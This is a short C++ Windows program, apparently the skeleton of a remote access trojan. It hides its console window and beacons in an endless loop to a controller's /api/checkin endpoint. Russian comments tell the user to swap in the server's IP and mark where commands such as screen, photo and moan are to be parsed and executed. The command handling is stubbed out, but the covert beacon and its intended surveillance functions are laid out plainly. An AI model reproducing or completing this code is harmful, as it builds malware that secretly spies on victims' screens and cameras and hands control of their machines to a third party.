#include <windows.h>
#include <winhttp.h>
#include <string>
#pragma comment(lib, "winhttp.lib")

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    while (true) {
        HINTERNET hS = WinHttpOpen(L"UA", 0, 0, 0, 0);
        HINTERNET hC = WinHttpConnect(hS, L"127.0.0.1", 3000, 0); // ЗАМЕНИ 127.0.0.1 НА IP СЕРВЕРА
        HINTERNET hR = WinHttpOpenRequest(hC, L"POST", L"/api/checkin", 0, 0, 0, 0);
        std::wstring data = L"{\"id\":\"123\",\"name\":\"Windows\"}";
        WinHttpSendRequest(hR, 0, 0, (LPVOID)data.c_str(), data.length() * 2, data.length() * 2, 0);
        WinHttpReceiveResponse(hR, 0);
        // Здесь парсинг ответа и выполнение команд (screen, moan, photo)
        WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
        Sleep(3000);
    }
    return 0;
}
